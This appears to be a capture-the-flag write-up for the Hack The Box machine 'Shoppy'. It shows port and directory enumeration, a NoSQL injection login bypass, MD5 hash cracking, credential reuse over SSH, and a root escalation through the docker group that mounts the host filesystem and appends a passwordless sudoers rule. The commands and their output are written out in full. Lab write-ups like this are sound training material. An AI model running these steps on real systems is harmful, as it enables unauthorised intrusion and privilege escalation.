---
layout: single
title: Shoppy - Hack The Box
excerpt: "Shoppy is a quick and fun easy box"
date: 2023-01-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-shoppy/shoppy.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - Sqli
  - Docker
---
![](/assets/images/htb-writeup-shoppy/shoppy.png)

Shoppy is a quick and fun easy box where we have to do a Sqli and use docker

## PortScan

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 19:28 CST
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title:             Shoppy Wait Page        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

If a use curl we can see a domain add to your /etc/hosts

```
❯ curl http://10.10.11.180 -I
HTTP/1.1 301 Moved Permanently
Server: nginx/1.23.1
Date: Wed, 11 Jan 2023 01:31:45 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://shoppy.htb
```

```
❯ /usr/bin/cat /etc/hosts | grep 10.10.11.180
10.10.11.180 shoppy.htb
```

Is working

```
❯ ping -c 1 shoppy.htb
PING shoppy.htb (10.10.11.180) 56(84) bytes of data.
64 bytes from shoppy.htb (10.10.11.180): icmp_seq=1 ttl=63 time=176 ms

--- shoppy.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 176.464/176.464/176.464/0.000 ms
```

## Enumeration

This are the services of are running in the website
```
❯ whatweb http://10.10.11.180
http://10.10.11.180 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.23.1], IP[10.10.11.180], RedirectLocation[http://shoppy.htb], Title[301 Moved Permanently], nginx[1.23.1]
http://shoppy.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.23.1], IP[10.10.11.180], JQuery, Script, Title[Shoppy Wait Page][Title element contains newline(s)!], nginx[1.23.1]
```

This is the web

![/assets/images/htb-writeup-shoppy/web1.png](/assets/images/htb-writeup-shoppy/web1.png)

I going to do fuzzing maybe are other routes that we can find

```
❯ gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -u shoppy.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/10 19:45:09 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/admin                (Status: 302) [Size: 28] [--> /login]   
/js                   (Status: 301) [Size: 171] [--> /js/]    
/css                  (Status: 301) [Size: 173] [--> /css/]   
/login                (Status: 200) [Size: 1074]              
/assets               (Status: 301) [Size: 179] [--> /assets/]
/Admin                (Status: 302) [Size: 28] [--> /login]   
/Login                (Status: 200) [Size: 1074]              
/fonts                (Status: 301) [Size: 177] [--> /fonts/] 
/ADMIN                (Status: 302) [Size: 28] [--> /login]   
/exports              (Status: 301) [Size: 181] [--> /exports/]
Progress: 2870 / 30001 (9.57%)                                ^C
[!] Keyboard interrupt detected, terminating.
                                                               
===============================================================
2023/01/10 19:45:22 Finished
===============================================================
```

We can see what is in /login

![/assets/images/htb-writeup-shoppy/panel1.png](/assets/images/htb-writeup-shoppy/panel1.png)

After trying a sqli I found this and works nosql injection from mongodb

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads)

![/assets/images/htb-writeup-shoppy/sqli.png](/assets/images/htb-writeup-shoppy/sqli.png)

We found this 

![/assets/images/htb-writeup-shoppy/enc.png](/assets/images/htb-writeup-shoppy/enc.png)

I click in Search for users and I found this

![/assets/images/htb-writeup-shoppy/enc2.png](/assets/images/htb-writeup-shoppy/enc2.png)

If I make the same injection of the admin panel we found this

![/assets/images/htb-writeup-shoppy/xd.png](/assets/images/htb-writeup-shoppy/xd.png)

If you click in the button you have hashes of users

![/assets/images/htb-writeup-shoppy/hash.png](/assets/images/htb-writeup-shoppy/hash.png)


```
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},
{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

I going to use john to crack the hashes

```
❯ /usr/bin/cat hashes
admin:23c6877d9e2b564ef8b32c3a23de27b2
josh:6ebcea65320589ca4f2f1ce039975995
```

We have credentials

```
❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
remembermethisway (josh)
1g 0:00:00:02 DONE (2023-01-10 20:12) 0.3968g/s 5691Kp/s 5691Kc/s 6014KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

I found this subdomain add to the /etc/hosts too 

```
❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 80 -u shoppy.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb
[+] Method:       GET
[+] Threads:      80
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/01/10 20:45:03 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb
```

```
❯ /usr/bin/cat /etc/hosts | grep 10.10.11.180
10.10.11.180 shoppy.htb mattermost.shoppy.htb 
```

It works

```
❯ ping -c 1 mattermost.shoppy.htb
PING shoppy.htb (10.10.11.180) 56(84) bytes of data.
64 bytes from shoppy.htb (10.10.11.180): icmp_seq=1 ttl=63 time=390 ms

--- shoppy.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 390.409/390.409/390.409/0.000 ms
```

We can try with the credentials 

```
josh:remembermethisway
```

So we can use the credentials

![/assets/images/htb-writeup-shoppy/login.png](/assets/images/htb-writeup-shoppy/login.png)

We can see more information and josh said they going to use docker for the deployment

![/assets/images/htb-writeup-shoppy/info.png](/assets/images/htb-writeup-shoppy/info.png)

We have more credentials

```
❯ /usr/bin/cat creden.txt
username: jaeger
password: Sh0ppyBest@pp!
```
I can connect with ssh 

```
❯ ssh jaeger@10.10.11.180
The authenticity of host '10.10.11.180 (10.10.11.180)' can't be established.
ECDSA key fingerprint is SHA256:KoI81LeAk+ps7zoc1ru39Mg7srdxjzOb1UgmdW6T6kI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.180' (ECDSA) to the list of known hosts.
jaeger@10.10.11.180's password: Sh0ppyBest@pp!
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan 10 20:41:53 2023 from 10.10.14.9
manpath: can't set the locale; make sure $LC_* and $LANG are correct
jaeger@shoppy:~$ export TERM=xterm
jaeger@shoppy:~$ export SHELL=bash
jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  Templates  Videos  shoppy_start.sh  user.txt
jaeger@shoppy:~$ cat user.txt 
ee767274d4b6558ca02c36fb23812540
jaeger@shoppy:~$
```
## Be root

We can run a binary as the user deploy

```
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
jaeger@shoppy:~$
```

We need a password 

```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: xd 
Access denied! This incident will be reported !
```

But we can see the file

```
jaeger@shoppy:/home/deploy$ cat password-manager
```

The data is messy but we can see this line

```
Please enter your master password: SampleAccess granted!
```

We can use the credential

```
Sample
```

And we have the credentials of deploy user

```
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

credentials

```
user:deploy 
password:Deploying@app!
```

We're in a docker group

```
❯ ssh deploy@10.10.11.180
deploy@10.10.11.180's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ bash 
deploy@shoppy:~$ export TERM=Xterm      
deploy@shoppy:~$ echo $TERM
xterm-kitty
deploy@shoppy:~$ export TERM=xterm
deploy@shoppy:~$ echo $TERM
xterm
deploy@shoppy:~$ whoami
deploy
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
deploy@shoppy:~$ hostname -I
10.10.11.180 172.17.0.1 dead:beef::250:56ff:feb9:66bf
```

After searching information I found this

- [https://gtfobins.github.io/gtfobins/docker/#shell](https://gtfobins.github.io/gtfobins/docker/#shell)

We can run a docker and be root in it, we follow the instructions

```
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# bash
root@26db7e3466f7:/# whoami
root
```

We're root but we are in the container 

```
root@26db7e3466f7:~# cat root.txt 
82cbc15ee0e3ce5c8b22fb620baf9d10
root@26db7e3466f7:~# hostname -I
172.17.0.2 
root@26db7e3466f7:~#
```

we can edit the file /usr/sudoers because we are root and see the mount changes on the real machine

```
root@26db7e3466f7:~# echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
root@26db7e3466f7:~# exit
exit
# exit
deploy@shoppy:~$ sudo -l
Matching Defaults entries for deploy on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User deploy may run the following commands on shoppy:
    (ALL) NOPASSWD: ALL
deploy@shoppy:~$ sudo su
root@shoppy:/home/deploy# id
uid=0(root) gid=0(root) groups=0(root)
root@shoppy:/home/deploy# hostname -I
10.10.11.180 172.17.0.1 dead:beef::250:56ff:feb9:66bf 
root@shoppy:/home/deploy# cat /root/root.txt
82cbc15ee0e3ce5c8b22fb620baf9d10
root@shoppy:/home/deploy#
```

